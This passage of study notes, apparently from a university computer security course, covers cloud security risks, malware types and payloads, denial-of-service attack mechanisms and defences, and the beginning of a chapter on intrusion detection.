Decrypt and check only partitions 1 and 2, reducing overhead and preserving security.</code></pre></li></ul><p>This allows limited query capability without full decryption</p><h3 id="Cloud-Security"><a href="#Cloud-Security" class="headerlink" title="Cloud Security"></a>Cloud Security</h3><h4 id="Cloud-Computing-Elements"><a href="#Cloud-Computing-Elements" class="headerlink" title="Cloud Computing Elements"></a>Cloud Computing Elements</h4><p><img src="/./CSC-final/Cloud_component_elements.png" alt="cloud component elements"></p><h4 id="Cloud-Service-Models"><a href="#Cloud-Service-Models" class="headerlink" title="Cloud Service Models"></a>Cloud Service Models</h4><ol><li>Software as a service (SaaS)<ul><li>Using software installed on clouds via web browsers</li></ul></li><li>Platform as a service (PaaS)<ul><li>Enabling customers to developing their own applications running on operating systems provided by clouds</li></ul></li><li>Infrastructure as a service (IaaS)<ul><li>Enabling customers to install their own operating systems (Amazon EC2 and Windows Azure)</li><li>Clouds provide hardware (virtualization of hardware)</li></ul></li></ol><h4 id="Common-Cloud-Security-Issues-Countermeasures"><a href="#Common-Cloud-Security-Issues-Countermeasures" class="headerlink" title="Common Cloud Security Issues &amp; Countermeasures"></a>Common Cloud Security Issues &amp; Countermeasures</h4><table><thead><tr><th align="left">⚠️ Risk</th><th align="left">📄 Description &#x2F; Causes</th><th align="left">📋 Recommended Actions</th></tr></thead><tbody><tr><td align="left"><strong>Abuse and Nefarious Use</strong></td><td align="left">Cloud providers often allow easy account creation via free trials or low-cost services, which can be exploited by attackers for spam, malware hosting, password cracking, or launching DDoS attacks.</td><td align="left">Implement stricter registration and identity verification for new accounts. Continuously monitor for suspicious or abnormal traffic patterns (e.g., traffic spikes, DDoS attempts).</td></tr><tr><td align="left"><strong>Insecure Interfaces and APIs</strong></td><td align="left">Public APIs are necessary for cloud service interaction, but poorly designed or unsecure APIs can become attack vectors. Exposed APIs can allow unauthorized data access or manipulation if not properly secured.</td><td align="left">Analyze and review API security models regularly. Enforce strong authentication (OAuth, API keys, certificates) and fine-grained access control. Understand and secure dependency chains of API interactions (microservices, 3rd-party APIs).</td></tr><tr><td align="left"><strong>Malicious Insiders</strong></td><td align="left">Employees within the cloud service provider (CSP) who have legitimate privileged access might intentionally abuse their position for unauthorized activities like data theft, sabotage, or surveillance.</td><td align="left">Strengthen internal governance policies. Require comprehensive employee background checks. Implement transparent activity logging, mandatory multi-person approval for sensitive operations, and breach notification policies.</td></tr><tr><td align="left"><strong>Shared Technology Issues</strong></td><td align="left">In Infrastructure as a Service (IaaS) models, multiple tenants share the same physical hardware, hypervisors, and storage. Weak isolation controls may allow one tenant to access or interfere with another’s data or operations.</td><td align="left">Adopt best security practices for installation, configuration, and operation. Regularly scan and audit hypervisors and virtual environments. Ensure strict access control, patch management, and tenant isolation mechanisms (hardware-enforced virtualization, hypervisor security).</td></tr><tr><td align="left"><strong>Data Loss or Leakage</strong></td><td align="left">Data stored in the cloud can be accidentally deleted, overwritten, or exposed by misconfiguration, poor access controls, or compromised systems.</td><td align="left">Use strong API access control and enforce data encryption (at rest and in transit). Perform periodic data integrity checks and vulnerability assessments. Conduct continuous management and configuration monitoring to prevent misconfigurations.</td></tr><tr><td align="left"><strong>Account or Service Hijacking</strong></td><td align="left">Stolen credentials or weak authentication mechanisms can let attackers impersonate legitimate users, access sensitive data, or disrupt services.</td><td align="left">Enforce strong password policies and mandatory two-factor authentication (2FA). Prohibit credential sharing and employ role-based access control (RBAC). Monitor for abnormal login attempts and session hijacking.</td></tr><tr><td align="left"><strong>Unknown Risk Profile</strong></td><td align="left">Cloud consumers often lack complete visibility into the provider’s infrastructure, data location, monitoring, or incident response procedures, making risk assessment and management difficult.</td><td align="left">Demand cloud providers disclose security logs, data handling policies, and infrastructure diagrams (to a reasonable extent). Implement service-level monitoring and real-time alerting for crucial infrastructure or data changes.</td></tr></tbody></table><h2 id="Chapter-6-Malicious-Software"><a href="#Chapter-6-Malicious-Software" class="headerlink" title="Chapter 6: Malicious Software"></a>Chapter 6: Malicious Software</h2><h3 id="Classification"><a href="#Classification" class="headerlink" title="Classification"></a>Classification</h3><ul><li><p>By Propagation</p><ul><li>Infected Content: Viruses infect existing content and then spread to other systems.</li><li>Software Vulnerabilities: Worms or drive-by-downloads exploit vulnerabilities to replicate.</li><li>Social Engineering: Techniques like spam email or Trojans convince users to bypass security and install malware.</li></ul></li><li><p>By Payload</p><ul><li>System Corruption: Malware can corrupt system or data files.</li><li>Theft of Service: Turns a system into a “zombie” agent.</li><li>Theft of Service: Turns a system into a “zombie” agent.</li><li>Stealthing: Hides the malware’s presence on the system.</li></ul></li><li><p>Others</p><ul><li>Independent vs. Host-Dependent: <br>Parasitic code like viruses needs a host program, while worms, Trojans, and bots are independent and self-contained.</li><li>Replicating vs. Non-Replicating: <br>Viruses and worms replicate, but Trojans and spam email do not.</li></ul></li><li><p>APT (Advanced Persistent Threats): <br>Long-term, targeted attacks that use multiple techniques to infiltrate and maintain access to a system.</p><ul><li>Advance: <ul><li>Using a wide variety of intrusion technologies and (custom) malware</li><li>Components <strong>may not be technically advanced</strong> but are carefully selected</li></ul></li><li>Persistent: <ul><li>Over an extended period against the target: maximize the chance of success</li><li>A variety of attacks may be progressively applied</li></ul></li></ul></li></ul><h3 id="Types-of-Malicious-Software"><a href="#Types-of-Malicious-Software" class="headerlink" title="Types of Malicious Software"></a>Types of Malicious Software</h3><h4 id="Viruses-A-piece-of-software-“infect”-other-programs"><a href="#Viruses-A-piece-of-software-“infect”-other-programs" class="headerlink" title="Viruses A piece of software: “infect” other programs"></a>Viruses <code>A piece of software: “infect” other programs</code></h4><ul><li><p>Components:</p><ul><li>Infection Mechanism: The means by which a virus spreads.</li><li>Trigger (Logic Bomb): An event or condition that determines when the payload is activated.</li><li>Payload: What the virus does beyond spreading, which can be damaging or benign.</li></ul></li><li><p>Virus Phases</p><ol><li>Dormant Phase: The virus is idle, activated by a specific event (not all viruses have this stage).</li><li>Triggering Phase: The virus activates to perform its intended function, often by system events.</li><li>Propagation Phase: The virus places copies of itself into other programs or system areas.</li><li>Execution Phase: The virus performs its function, which can be harmless or damaging.</li></ol></li><li><p>Virus Classifications:</p><ol><li>By Target:<ol><li>Boot Sector Infector: Infects master boot records or boot records.</li><li>File Infector: Infects executable files.</li><li>Macro Virus: Infects files with macro or scripting code interpreted by applications (e.g., MS Word macros, Adobe PDF JavaScript).</li><li>Multipartite Virus: Infects files in multiple ways or multiple types of files.</li></ol></li><li>By Concealment Strategy:<ol><li>Encrypted Virus: Uses encryption with random keys to obscure its content.</li><li>Stealth Virus: Hides from detection using code mutation, compression, or rootkit techniques.</li><li>Polymorphic Virus: Creates functionally equivalent copies with different bit patterns to vary its “signature.”</li><li>Metamorphic Virus: Rewrites itself completely at each infection, changing both behavior and appearance.</li></ol></li></ol></li></ul><h4 id="Worms-Propagation-via-Vulnerability-Exploit”"><a href="#Worms-Propagation-via-Vulnerability-Exploit”" class="headerlink" title="Worms Propagation via Vulnerability Exploit”"></a>Worms <code>Propagation via Vulnerability Exploit”</code></h4><ul><li><p>Worm Replication Methods</p><ul><li>Email or instant messenger attachments.</li><li>File sharing on removable media or exploiting autorun mechanisms.</li><li>Remote execution, file access, or login capabilities.</li></ul></li><li><p>Scanning Techniques: <br> Search for other systems to infect</p><ul><li>Random scanning.</li><li>Hit-list scanning.</li><li>Topological scanning.</li><li>Local subnet scanning.</li></ul></li><li><p>State of Worm Technology</p><ul><li><p>Multiplatform:<br>  Capable of infecting various operating systems (e.g., Windows, Linux, Android, macOS) through cross-platform techniques.</p></li><li><p>Multi-Exploit:<br>  Equipped with multiple vulnerability exploits to maximize infection opportunities on different systems.</p></li><li><p>Ultrafast Spreading:<br>  Modern worms can propagate across networks at extremely high speeds, infecting vast numbers of systems within minutes (e.g., SQL Slammer worm).</p></li><li><p>Polymorphism:<br>  Generates functionally identical but byte-wise different copies of itself with every replication, making signature-based detection difficult.</p></li><li><p>Metamorphism:<br>  Fully rewrites its own code upon each infection, altering both appearance and behavior patterns to evade heuristic detection.</p></li><li><p>Transport Vehicles:<br>  Efficiently deliver additional malicious payloads (like DDoS bots, ransomware, or spyware) alongside their propagation mechanisms.</p></li><li><p>Zero-Day Exploit Usage:<br>  Frequently leverages undisclosed (zero-day) vulnerabilities for which no patches exist, maximizing infection before countermeasures are available.</p></li></ul></li><li><p>Example:</p></li></ul><table><thead><tr><th align="left">📅 Worm Name</th><th align="left">📖 Year</th><th align="left">📋 Attack Vector</th><th align="left">🛠️ Exploited Vulnerability &#x2F; Mechanism</th><th align="left">💥 Impact &#x2F; Significance</th></tr></thead><tbody><tr><td align="left"><strong>Morris Worm</strong></td><td align="left">1988</td><td align="left">UNIX systems over networks</td><td align="left">- Cracked local password files to log into remote systems.<br>- Exploited <code>finger</code> service overflow and <code>sendmail</code> debug mode backdoor.</td><td align="left">⚠️ First major worm incident in history. Spread uncontrollably, causing widespread system slowdowns and outages on the early Internet.</td></tr><tr><td align="left"><strong>Melissa</strong></td><td align="left">1999</td><td align="left">Email attachments via Microsoft Outlook</td><td align="left">Social engineering: an infected Word document emailed itself to the first 50 contacts in Outlook.</td><td align="left">📧 Infected over 100,000 systems in 3 days, causing email servers to overload. One of the first mass-mailing worms.</td></tr><tr><td align="left"><strong>Code Red</strong></td><td align="left">2001</td><td align="left">Internet-facing Microsoft IIS web servers</td><td align="left">Buffer overflow vulnerability in Microsoft Internet Information Services (IIS) (specifically <code>idq.dll</code>).</td><td align="left">🌐 Infected nearly 360,000 servers in 14 hours. Launched DDoS attacks and defaced web pages.</td></tr><tr><td align="left"><strong>Klez</strong></td><td align="left">2001</td><td align="left">Email propagation</td><td align="left">Masqueraded as legitimate email attachments.<br>Activated destructive payloads on certain trigger dates, overwriting files and data.</td><td align="left">🗑️ Caused data loss by emptying files on infected systems. Among the most widespread email worms of its time.</td></tr><tr><td align="left"><strong>SQL Slammer</strong></td><td align="left">2003</td><td align="left">Internet-exposed MS SQL Servers</td><td align="left">Buffer overflow in MS SQL Server’s SQL Resolution Service on UDP port 1434.</td><td align="left">⚡ Infected 90% of vulnerable hosts worldwide within 10 minutes, disrupting internet traffic and financial systems.</td></tr><tr><td align="left"><strong>Sobig.F</strong></td><td align="left">2003</td><td align="left">Email and open proxy servers</td><td align="left">Mass-mailed itself via open proxy servers and email attachments.</td><td align="left">📨 Generated over 1 million copies in its first 24 hours, effectively turning infected systems into spam engines.</td></tr><tr><td align="left"><strong>Stuxnet</strong></td><td align="left">2010</td><td align="left">Industrial control systems (ICS), nuclear facilities</td><td align="left">Zero-day vulnerabilities in Windows.<br>Spread via USB drives, network shares, and LAN vulnerabilities.<br>Targeted Siemens industrial control systems.</td><td align="left">🎯 First known cyberweapon aimed at physical infrastructure (Iran’s nuclear program). Highly stealthy, limiting spread to avoid detection while sabotaging specific systems.</td></tr></tbody></table><ul><li>Drive-By-Downloads (隨意下載)<br><strong>Definition</strong><br>  Exploits browser or plugin vulnerabilities to silently download and install malicious software when a user visits a compromised website.<br><strong>Key Characteristics</strong><br>  Does not require user interaction.<br>  Often embedded in malicious advertising or compromised legitimate sites.<br><strong>Historical Examples</strong><br>Exploits in Adobe Flash Player and Java browser plugins were historically favored for these attacks.<br><strong>Relation to Worms</strong><br>Although typically not self-propagating like classic worms, drive-by downloads can be combined with worm mechanisms for automatic spread via compromised sites.</li></ul><h4 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h4><ul><li>Spam: Unsolicited bulk email, a significant carrier of malware, also used for phishing attacks.</li><li>Trojan Horse: A program containing harmful hidden code that accomplishes functions an attacker could not directly perform. Mobile phone Trojans first appeared in 2004.</li><li>Phishing: Exploits user trust by masquerading as communication from a trusted source, often including URLs to fake websites mimicking legitimate login pages. Spear-phishing is a more targeted form where recipients are carefully researched, and emails are crafted with specific information to appear authentic.</li></ul><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><ul><li><p>Categories</p><ol><li>System Corruption: <br> Compromise the Confidentiality, Integrity, or Availability (CIA) of data, applications, or operating systems.</li></ol><table><thead><tr><th align="left">Type</th><th align="left">Example</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">🦠 Virus</td><td align="left"><strong>Chernobyl (1998)</strong></td><td align="left">Infects Windows 95&#x2F;98 executables. Wipes file systems and even overwrites BIOS on a trigger date.</td></tr><tr><td align="left">🐛 Worm</td><td align="left"><strong>Klez (2001)</strong></td><td align="left">On a specific date, erases hard disk data in Windows 95-XP systems.</td></tr><tr><td align="left">🔒 Ransomware</td><td align="left"><strong>PC Cyborg (1989), WannaCry (2017)</strong></td><td align="left">Encrypts victim data and demands ransom to decrypt.</td></tr><tr><td align="left">🐞 Industrial Worm</td><td align="left"><strong>Stuxnet (2010)</strong></td><td align="left">Sabotages industrial control systems like nuclear centrifuges by altering operating parameters.</td></tr><tr><td align="left">💣 Logic Bomb</td><td align="left">Triggered code segment</td><td align="left">Activated under predefined conditions, e.g., deleting files on a specific date or after user login.</td></tr></tbody></table><ol start="2"><li>Attack Agents <br> Objective: Hijack systems to conduct coordinated cyberattacks.</li></ol><table><thead><tr><th align="left">Type</th><th align="left">Example Description</th></tr></thead><tbody><tr><td align="left">🧟‍♂️ <strong>Zombie&#x2F;Botnet</strong></td><td align="left">Compromised machines used to conduct DDoS, spam, sniffing, or remote attacks.</td></tr><tr><td align="left">📡 <strong>Remote Control</strong></td><td align="left">Bots typically await instructions via IRC, HTTP C2 servers, or P2P communication.</td></tr></tbody></table><ol start="3"><li>Information Theft: <br> Steal sensitive information through stealthy monitoring and deception.</li></ol><table><thead><tr><th align="left">Method</th><th align="left">Example&#x2F;Technique</th></tr></thead><tbody><tr><td align="left">🔑 <strong>Keylogger</strong></td><td align="left">Captures keystrokes, often filtering for passwords or card numbers.</td></tr><tr><td align="left">🎣 <strong>Phishing</strong></td><td align="left">Mimics legitimate services to trick users into disclosing credentials.</td></tr><tr><td align="left">🎯 <strong>Spear-phishing</strong></td><td align="left">Highly targeted phishing tailored using personal information.</td></tr><tr><td align="left">🕵️ <strong>Spyware</strong></td><td align="left">Tracks web activity, redirects requests, or alters traffic content.</td></tr><tr><td align="left">🖱️ <strong>Clickjacking</strong></td><td align="left">Overlays invisible elements, hijacking clicks or keystrokes unknowingly.</td></tr></tbody></table><ol start="4"><li>Stealthing: <br>Evade detection and maintain long-term access to infected systems.</li></ol><table><thead><tr><th align="left">Type</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">🔐 <strong>Backdoor (Trapdoor)</strong></td><td align="left">Secret code paths granting attackers bypass access. Often installed for debugging, but later abused.</td></tr><tr><td align="left">👑 <strong>Rootkit</strong></td><td align="left">Software package hiding processes, files, or logs. Provides persistent root-level control.</td></tr></tbody></table><ul><li>Rootkit Classifications:<ol><li>Persistent: Survives reboots.</li><li>Memory-based: Resides in RAM, harder to detect but lost on reboot.</li><li>User-mode: Intercepts API calls.</li><li>Kernel-mode: Alters OS kernel data structures.</li><li>Virtual Machine-based: Installs a hypervisor to control the OS.</li><li>External-mode: Operates outside the OS (e.g., BIOS or SMM).</li></ol></li></ul></li></ul><h4 id="Countermeasures-1"><a href="#Countermeasures-1" class="headerlink" title="Countermeasures"></a>Countermeasures</h4><ul><li><p>Elements:</p><ul><li>Policy: Implementing policies like installing all patches.</li><li>Awareness: Providing training courses to users.</li><li>Vulnerability Mitigation: Disabling unused services.</li><li>Threat Mitigation: Installing anti-virus and Intrusion Detection System (IDS) software.</li></ul></li><li><p>Host-based Scanners (Anti-virus Software):</p><ol><li>First Generation: Simple scanners that rely on malware signatures.</li><li>Second Generation: Heuristic scanners that execute programs in a VM, decompile and analyze source codes, or use integrity checking.</li><li>Third Generation: Activity traps that identify malware by its actions.</li><li>Fourth Generation: Full-featured protection packages combining various anti-virus techniques, including scanning, activity traps, and access control (e.g., firewalls).</li></ol></li><li><p>Other Countermeasures:</p><ul><li>Sandboxing: Running untrusted code in a controlled environment to prevent system compromise.</li><li>Host-based Behavior-Blocking Software: Integrates with the OS to monitor program behavior in real-time for malicious actions, blocking them before they can affect the system.<br>  <em>A drawback is that malicious code must run to be identified, potentially causing harm before detection.</em></li><li>Spyware detection and removal.</li><li>Rootkit countermeasures:<ul><li>scan memory, kernel modules, and system call tables for hidden processes or anomalies.</li></ul></li><li>Perimeter scanning approaches<ul><li>Deploy firewalls and Intrusion Detection&#x2F;Prevention Systems (IDS&#x2F;IPS) at network boundaries to detect malicious traffic.</li><li>Utilize email and web proxies to scan attachments and downloads before they reach internal systems.</li></ul></li><li>Distributed Intelligence gathering approaches.<ul><li>Leverage cloud-based threat intelligence platforms and collaborative databases to gather malware indicators (like IPs, hashes, domains). </li><li>Use <strong>honeypots</strong> and threat sensors to collect live attack data and contribute to global malware intelligence.</li></ul></li></ul></li></ul><h2 id="Chapter-7-Denial-of-Service"><a href="#Chapter-7-Denial-of-Service" class="headerlink" title="Chapter 7: Denial of Service"></a>Chapter 7: Denial of Service</h2><ul><li><p><strong>Def</strong><br>An attack that disrupts availability by exhausting system resources like:</p><ul><li>CPU processing power</li><li>Memory (RAM)</li><li>Network bandwidth</li><li>Disk storage space</li></ul></li><li><p>Primary Objective<br>DoS attacks aim to <strong>compromise availability</strong> -</p></li></ul><h3 id="Types-of-DoS-Attacks"><a href="#Types-of-DoS-Attacks" class="headerlink" title="Types of DoS Attacks"></a>Types of DoS Attacks</h3><table><thead><tr><th align="left">Category</th><th align="left">Target</th><th align="left">Method</th><th align="left">Impact</th></tr></thead><tbody><tr><td align="left"><strong>Network Bandwidth</strong></td><td align="left">Network connections</td><td align="left">Flood with traffic</td><td align="left">Legitimate traffic blocked</td></tr><tr><td align="left"><strong>System Resources</strong></td><td align="left">Server software&#x2F;hardware</td><td align="left">Overload connection tables&#x2F;processes</td><td align="left">System crashes&#x2F;unresponsive</td></tr><tr><td align="left"><strong>Application Resources</strong></td><td align="left">Application-layer services</td><td align="left">Bombard with resource-heavy valid requests</td><td align="left">Service slowdown&#x2F;failure</td></tr></tbody></table><h3 id="Classic-DoS-Attack-Types"><a href="#Classic-DoS-Attack-Types" class="headerlink" title="Classic DoS Attack Types"></a>Classic DoS Attack Types</h3><h4 id="Ping-Flooding-Attack"><a href="#Ping-Flooding-Attack" class="headerlink" title="Ping Flooding Attack"></a>Ping Flooding Attack</h4><ul><li><strong>Protocol</strong>: ICMP echo request and response packets</li><li><strong>Mechanism</strong>: Flood target organization’s network connection capacity</li><li><strong>Characteristics</strong>:<ul><li>Attack traffic handled at high-capacity links but dropped as capacity decreases</li><li><strong>Disadvantage</strong>: Attack source clearly visible</li><li>Risk of <strong>attack reflection</strong> on source system</li></ul></li></ul><h4 id="SYN-Spoofing"><a href="#SYN-Spoofing" class="headerlink" title="SYN Spoofing"></a>SYN Spoofing</h4><ul><li><strong>Target</strong>: TCP connection request handling capability</li><li><strong>Mechanism</strong>: Fill connection management tables with fake connection requests</li><li><strong>Advantage</strong>: Relatively low actual SYN traffic required to maintain full TCP connection tables</li><li><strong>Impact</strong>: Legitimate connections cannot be established</li></ul><h3 id="Source-Address-Spoofing"><a href="#Source-Address-Spoofing" class="headerlink" title="Source Address Spoofing"></a>Source Address Spoofing</h3><h4 id="Technical-Background"><a href="#Technical-Background" class="headerlink" title="Technical Background"></a>Technical Background</h4><ul><li><strong>Root Cause</strong>: TCP&#x2F;IP developed in collaborative, trusted environments</li><li><strong>Vulnerability</strong>: No built-in capability to ensure valid source addresses</li><li><strong>Attacker Benefit</strong>: Makes identification significantly more difficult</li></ul><h4 id="Countermeasures-2"><a href="#Countermeasures-2" class="headerlink" title="Countermeasures"></a>Countermeasures</h4><ul><li><strong>Router Filtering</strong>: Implement at ISP connection boundaries (closest to originating systems)</li><li><strong>Challenge</strong>: Many ISPs do not implement such filtering</li></ul><h3 id="Flooding-Attack-Classifications-by-Network-Protocol"><a href="#Flooding-Attack-Classifications-by-Network-Protocol" class="headerlink" title="Flooding Attack Classifications by Network Protocol"></a>Flooding Attack Classifications by Network Protocol</h3><h4 id="UDP-Flood"><a href="#UDP-Flood" class="headerlink" title="UDP Flood"></a>UDP Flood</h4><ul><li><strong>Method</strong>: UDP packets directed at specific port numbers</li><li><strong>Example</strong>: DNS UDP flood attacks</li></ul><h4 id="TCP-SYN-Flood"><a href="#TCP-SYN-Flood" class="headerlink" title="TCP SYN Flood"></a>TCP SYN Flood</h4><ul><li><strong>Method</strong>: TCP packets sent to target system</li><li><strong>Focus</strong>: Total packet volume rather than exploiting system code vulnerabilities</li></ul><h3 id="Distributed-Denial-of-Service-DDoS-Attacks"><a href="#Distributed-Denial-of-Service-DDoS-Attacks" class="headerlink" title="Distributed Denial of Service (DDoS) Attacks"></a>Distributed Denial of Service (DDoS) Attacks</h3><h4 id="Architecture-and-Components"><a href="#Architecture-and-Components" class="headerlink" title="Architecture and Components"></a>Architecture and Components</h4><h5 id="Attack-Infrastructure"><a href="#Attack-Infrastructure" class="headerlink" title="Attack Infrastructure"></a>Attack Infrastructure</h5><ul><li><strong>Multiple Systems</strong>: Use numerous compromised systems for attack generation</li><li><strong>Malware Deployment</strong>: Compromise systems and install attack agents (zombies)</li><li><strong>Botnet</strong>: Large collection of zombie systems controlled by single attacker</li></ul><h5 id="Control-Mechanisms"><a href="#Control-Mechanisms" class="headerlink" title="Control Mechanisms"></a>Control Mechanisms</h5><ul><li><strong>Traditional</strong>: IRC server-based control</li><li><strong>Modern</strong>: HTTP-based covert channels, P2P protocols</li><li><strong>Key Distinction</strong>: Remote control capability differentiates bots from self-propagating worms</li></ul><h4 id="Botnet-Capabilities"><a href="#Botnet-Capabilities" class="headerlink" title="Botnet Capabilities"></a>Botnet Capabilities</h4><ul><li>Distributed Denial of Service (DDoS) attacks</li><li>Spam distribution</li><li>Network traffic sniffing</li><li>Keylogging</li><li>New malware propagation</li><li>Adware and Browser Helper Object (BHO) installation</li><li>IRC chat network attacks</li><li>Online voting&#x2F;gaming manipulation</li></ul><h4 id="Historical-DDoS-Tools"><a href="#Historical-DDoS-Tools" class="headerlink" title="Historical DDoS Tools"></a>Historical DDoS Tools</h4><ul><li><strong>Tribe Flood Network (TFN)</strong>: Earliest and most famous DDoS tool</li><li><strong>TFN2K</strong>: Multi-OS support, multiple flood attack capabilities, advanced hiding mechanisms</li><li><strong>Modern Tools</strong>: Focus on stealth and concealment</li></ul><h3 id="Application-Based-Bandwidth-Attacks"><a href="#Application-Based-Bandwidth-Attacks" class="headerlink" title="Application-Based Bandwidth Attacks"></a>Application-Based Bandwidth Attacks</h3><h4 id="SIP-Session-Initiation-Protocol-Flood"><a href="#SIP-Session-Initiation-Protocol-Flood" class="headerlink" title="SIP (Session Initiation Protocol) Flood"></a>SIP (Session Initiation Protocol) Flood</h4><ul><li><strong>Target</strong>: VoIP systems</li><li><strong>Mechanism</strong>: Single INVITE request triggers massive resource consumption</li><li><strong>Impact</strong>: <ul><li>Server processing resource depletion</li><li>Network capacity consumption</li><li>Legitimate call rejection</li></ul></li></ul><h4 id="HTTP-Based-Attacks"><a href="#HTTP-Based-Attacks" class="headerlink" title="HTTP-Based Attacks"></a>HTTP-Based Attacks</h4><h5 id="HTTP-Flood"><a href="#HTTP-Flood" class="headerlink" title="HTTP Flood"></a>HTTP Flood</h5><ul><li><strong>Method</strong>: Massive HTTP request bombardment</li><li><strong>Resource Consumption</strong>: Memory, processing, and transmission resources</li><li><strong>Example</strong>: Large file download requests</li></ul><h5 id="Slowloris-Attack"><a href="#Slowloris-Attack" class="headerlink" title="Slowloris Attack"></a>Slowloris Attack</h5><ul><li><strong>Objective</strong>: Monopolize all available request processing threads</li><li><strong>Method</strong>: Send HTTP requests that never complete</li><li><strong>Technical Exploitation</strong>:<ul><li>Exploits HTTP protocol requirement for blank line to separate headers from payload</li><li>Send incomplete requests missing the blank line</li><li>Periodically send additional header lines to maintain connection</li></ul></li><li><strong>Detection Challenge</strong>: Uses seemingly legitimate HTTP traffic, difficult for signature-based solutions</li></ul><h3 id="Reflection-and-Amplification-Attacks"><a href="#Reflection-and-Amplification-Attacks" class="headerlink" title="Reflection and Amplification Attacks"></a>Reflection and Amplification Attacks</h3><h4 id="Reflection-Attacks"><a href="#Reflection-Attacks" class="headerlink" title="Reflection Attacks"></a>Reflection Attacks</h4><ul><li><strong>Mechanism</strong>: Use normal server systems as attack intermediaries</li><li><strong>Process</strong>:<ol><li>Attacker sends packets with spoofed victim source address to intermediary</li><li>Intermediary sends responses to victim</li></ol></li><li><strong>Intermediaries</strong>: High-capacity web servers or routers</li><li><strong>Advantages</strong>: Easier deployment, harder to trace actual attacker</li></ul><h4 id="Amplification-Attacks"><a href="#Amplification-Attacks" class="headerlink" title="Amplification Attacks"></a>Amplification Attacks</h4><ul><li><strong>Objective</strong>: Create larger response packets than requests</li><li><strong>Target Services</strong>: <ul><li>UDP services: DNS, SNMP, ISAKMP, UDP echo</li><li>TCP services: TCP SYN</li></ul></li><li><strong>Network Broadcast</strong>: Direct requests to network broadcast addresses</li></ul><h5 id="DNS-Amplification-Attack-Example"><a href="#DNS-Amplification-Attack-Example" class="headerlink" title="DNS Amplification Attack Example"></a>DNS Amplification Attack Example</h5><ul><li><strong>Mechanism</strong>: Use legitimate DNS servers as intermediaries</li><li><strong>Process</strong>: Small request converted to much larger response</li><li><strong>Enhancement</strong>: Extended DNS features (IPv6) enable larger responses</li></ul><h4 id="Defense-Measures"><a href="#Defense-Measures" class="headerlink" title="Defense Measures"></a>Defense Measures</h4><ul><li>Prevent directed broadcast routing to internal networks</li><li>Block spoofed source addresses</li><li>Implement ingress filtering at network boundaries</li></ul><h3 id="DoS-Attack-Defense-Strategies"><a href="#DoS-Attack-Defense-Strategies" class="headerlink" title="DoS Attack Defense Strategies"></a>DoS Attack Defense Strategies</h3><h4 id="Four-Lines-of-Defense"><a href="#Four-Lines-of-Defense" class="headerlink" title="Four Lines of Defense"></a>Four Lines of Defense</h4><ol><li><strong>Attack Prevention and Preemption</strong>: Before attacks occur</li><li><strong>Attack Detection and Filtering</strong>: During attacks</li><li><strong>Attack Source Traceback and Identification</strong>: During and after attacks</li><li><strong>Attack Reaction</strong>: After attacks</li></ol><h4 id="Prevention-Measures"><a href="#Prevention-Measures" class="headerlink" title="Prevention Measures"></a>Prevention Measures</h4><h5 id="Network-Level-Protections"><a href="#Network-Level-Protections" class="headerlink" title="Network-Level Protections"></a>Network-Level Protections</h5><ul><li><strong>Source Address Validation</strong>: Block spoofed source addresses at routers near sources</li><li><strong>Path Validation Filters</strong>: Ensure packet paths return to claimed source addresses</li><li><strong>Rate Limiting</strong>: Limit specific packet types</li><li><strong>IP Directed Broadcast Blocking</strong></li><li><strong>Suspicious Service&#x2F;Combination Blocking</strong></li></ul><h5 id="System-Level-Protections"><a href="#System-Level-Protections" class="headerlink" title="System-Level Protections"></a>System-Level Protections</h5><ul><li><strong>Modified TCP Connection Handling</strong>: Cryptographically encode important information in server initial sequence numbers</li><li><strong>Selective Dropping</strong>: Drop incomplete connection entries when TCP connection table overflows</li><li><strong>Parameter Modification</strong>: Adjust table sizes and timeout values</li></ul><h5 id="Application-Level-Protections"><a href="#Application-Level-Protections" class="headerlink" title="Application-Level Protections"></a>Application-Level Protections</h5><ul><li><strong>CAPTCHA Systems</strong>: Distinguish legitimate human requests from automated attacks</li><li><strong>Mirrored and Replicated Servers</strong>: For high-performance and high-reliability requirements</li></ul><h5 id="Response-Steps"><a href="#Response-Steps" class="headerlink" title="Response Steps"></a>Response Steps</h5><ol><li><strong>Attack Type Identification</strong></li><li><strong>Packet Capture and Analysis</strong></li><li><strong>Filter Design</strong>: Block attack traffic upstream or identify&#x2F;fix system&#x2F;application bugs</li><li><strong>ISP Coordination</strong>: Request packet flow tracing back to source (difficult and time-consuming but necessary for legal action)</li><li><strong>Response Plan Implementation</strong>: <ul><li>Switch to backup servers</li><li>Activate new servers at alternative locations</li></ul></li><li><strong>Incident Response Plan Updates</strong>: Analyze attacks and responses for future preparedness</li></ol><h3 id="Technical-Challenges-and-Limitations"><a href="#Technical-Challenges-and-Limitations" class="headerlink" title="Technical Challenges and Limitations"></a>Technical Challenges and Limitations</h3><h4 id="Defense-Difficulties"><a href="#Defense-Difficulties" class="headerlink" title="Defense Difficulties"></a>Defense Difficulties</h4><ul><li><strong>High Traffic Legitimacy</strong>: High traffic volumes may be legitimate (popular websites)</li><li><strong>Cost Implications</strong>: Providing additional network bandwidth and distributed servers is expensive</li><li><strong>Complete Prevention</strong>: DoS attacks cannot be completely prevented</li></ul><h4 id="Resource-Requirements"><a href="#Resource-Requirements" class="headerlink" title="Resource Requirements"></a>Resource Requirements</h4><ul><li><strong>Additional Network Bandwidth</strong>: Significant investment required</li><li><strong>Distributed Server Infrastructure</strong>: High implementation and maintenance costs</li><li><strong>Monitoring and Analysis Tools</strong>: Sophisticated detection systems needed</li></ul><h2 id="Chapter-8-Intrusion-Detection"><a href="#Chapter-8-Intrusion-Detection" class="headerlink" title="Chapter 8: Intrusion Detection"></a>Chapter 8: Intrusion Detection</h2><h3 id="Types-of-Intrusion"><a href="#Types-of-Intrusion" class="headerlink" title="Types of Intrusion"></a>Types of Intrusion</h3><h4 id="Classified-by-Motivation"><a href="#Classified-by-Motivation" class="headerlink" title="Classified by Motivation"></a>Classified by Motivation</h4><ol><li><strong>Cyber Criminals</strong></li><li><strong>Activists</strong></li><li><strong>State-Sponsored Organizations</strong></li><li><strong>Other Hackers</strong></li></ol><h4 id="Classified-by-Skill-Level"><a href="#Classified-by-Skill-Level" class="headerlink" title="Classified by Skill Level"></a>Classified by Skill Level</h4><ol><li><strong>Apprentice Level</strong></li><li><strong>Journeyman Level</strong></li><li><strong>Master Level</strong></li></ol><h4 id="Attack-Methodology"><a href="#Attack-Methodology" class="headerlink" title="Attack 